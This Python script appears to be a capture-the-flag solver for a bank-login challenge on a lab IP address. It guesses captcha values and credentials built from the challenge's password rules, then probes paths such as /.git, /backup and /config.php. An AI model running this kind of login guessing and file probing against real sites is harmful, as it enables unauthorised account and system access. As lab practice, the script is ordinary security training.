#!/usr/bin/env python3
"""
Bank login challenge solver
The captcha is static, need to figure out the correct value
Password rules are complex, this might be the key to finding valid credentials
"""

import requests
import re
from itertools import product

URL = "http://192.168.100.127:8051"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"

session = requests.Session()
session.headers.update({"User-Agent": USER_AGENT})

# First, let's understand the password constraints:
# 1. Length: 6-10 characters
# 2. At least one uppercase letter
# 3. At least one lowercase letter
# 4. At least one digit
# 5. Letters must be separated by at least 3 other characters
# 6. No same or consecutive digits (no 11, 12, 21, 23, etc.)
# 7. No special symbols or spaces
# 8. Cannot contain any character from userid
# 9. Cannot contain birthday, phone, ID, email, weight, etc.


def check_password_rules(passwd, userid=""):
    """Check if password meets the complex rules"""
    # Rule 1: Length 6-10
    if not (6 <= len(passwd) <= 10):
        return False

    # Rule 2-4: Must have uppercase, lowercase, digit
    if not re.search(r"[A-Z]", passwd):
        return False
    if not re.search(r"[a-z]", passwd):
        return False
    if not re.search(r"[0-9]", passwd):
        return False

    # Rule 7: No special symbols or spaces
    if not re.match(r"^[A-Za-z0-9]+$", passwd):
        return False

    # Rule 5: Letters must be separated by at least 3 characters
    letter_positions = [i for i, c in enumerate(passwd) if c.isalpha()]
    for i in range(len(letter_positions) - 1):
        if (
            letter_positions[i + 1] - letter_positions[i] < 4
        ):  # Less than 3 chars between
            return False

    # Rule 6: No same or consecutive digits
    digits = [c for c in passwd if c.isdigit()]
    for i in range(len(digits) - 1):
        if abs(int(digits[i]) - int(digits[i + 1])) <= 1:
            return False

    # Rule 8: Cannot contain any character from userid
    if userid:
        for c in userid:
            if c in passwd:
                return False

    return True


# Let's first check what the static captcha value is
# Looking at the image, it appears to have colorful text: "15鼠889"
# Let's try different captcha values


def try_login(userid, passwd, captcha):
    """Attempt login"""
    data = {"userid": userid, "passwd": passwd, "captcha": captcha}

    resp = session.post(f"{URL}/app.php", data=data, allow_redirects=False)
    print(f"[*] Trying: userid={userid}, passwd={passwd}, captcha={captcha}")
    print(f"    Status: {resp.status_code}")

    if resp.status_code == 302:
        location = resp.headers.get("Location", "")
        print(f"    Redirect: {location}")

        # Follow redirect to see the result
        if location and location != "/":
            resp2 = session.get(f"{URL}{location}")
            print(f"    Content length: {len(resp2.text)}")
            if "CSC{" in resp2.text or "flag" in resp2.text.lower():
                print(f"[+] SUCCESS!")
                print(resp2.text)
                return True

    return False


# Test various captcha values from the image
captcha_candidates = [
    "15鼠889",
    "15R889",
    "15鼠88",
    "15R88",
    "158889",
    "15889",
]

# Common userids to try
userids = ["admin", "user", "test", "guest", "root"]

# Generate some passwords that meet the rules
# Format: digit(s) + letter + digit(s) + letter + digit(s)
# Example: 0a2b4 (but need to check consecutive digit rule)


def generate_passwords(userid=""):
    """Generate passwords that meet all rules"""
    passwords = []

    # Pattern: d1 d2 d3 L1 d4 d5 d6 L2 d7 d8
    # Where letters are separated by at least 3 chars
    # And no consecutive/same digits

    # Simple patterns to try first
    simple_patterns = [
        "0a2e4",  # Too short
        "0a2e4i6",  # 7 chars
        "0A2e4i6",  # Mixed case
        "0A2e4",
        "9A0e4",
        "9A0e7",
        "0A3e6i9",  # 8 chars
    ]

    for p in simple_patterns:
        if check_password_rules(p, userid):
            passwords.append(p)

    return passwords


print("[*] Testing captcha and basic credentials...")

# First let's find the correct captcha by trying basic login
for captcha in captcha_candidates[:3]:  # Try first few
    if try_login("test", "Test123", captcha):
        break

print("\n[*] Now let's try to find valid credentials...")
print("[*] Password must follow extremely strict rules")

# The challenge says "密碼設計那麼複雜幹嘛😡"
# This suggests we need to either:
# 1. Find a way to bypass the password check
# 2. Find the actual password through some leak/hint
# 3. Exploit a weakness in the validation

# Let's check if there's any other endpoint or file
print("\n[*] Checking for other files...")
for path in ["/robots.txt", "/app.php", "/.git", "/backup", "/admin", "/config.php"]:
    resp = session.get(f"{URL}{path}")
    print(f"  {path}: {resp.status_code}")
